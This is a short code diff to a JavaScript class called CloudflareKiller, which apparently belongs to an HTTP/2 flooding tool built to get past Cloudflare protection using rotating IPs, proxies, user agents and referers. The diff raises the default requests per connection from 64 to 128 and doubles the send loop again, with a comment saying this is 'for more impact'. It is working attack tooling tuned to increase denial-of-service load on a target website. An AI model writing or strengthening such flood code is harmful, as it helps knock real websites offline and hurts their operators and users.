@@ -12,7 +12,7 @@ import { globalIPRotator } from '../../utils/ip-rotator.js';
  * Bypass Cloudflare protection dengan multiple techniques
  */
 export class CloudflareKiller {
-    constructor(targetUrl, duration, rpc = 64, userAgents = [], referers = [], proxies = null) {
+    constructor(targetUrl, duration, rpc = 128, userAgents = [], referers = [], proxies = null) {
         try {
             this.url = new URL(targetUrl);
         } catch (err) {
@@ -89,8 +89,8 @@ export class CloudflareKiller {
                     resolve();
                 });
 
-                // Send multiple requests per connection
-                for (let i = 0; i < this.rpc; i++) {
+                // Send multiple requests per connection (doubled for more impact)
+                for (let i = 0; i < this.rpc * 2; i++) {
                     try {
                         const req = client.request({
                             ':method': 'GET',
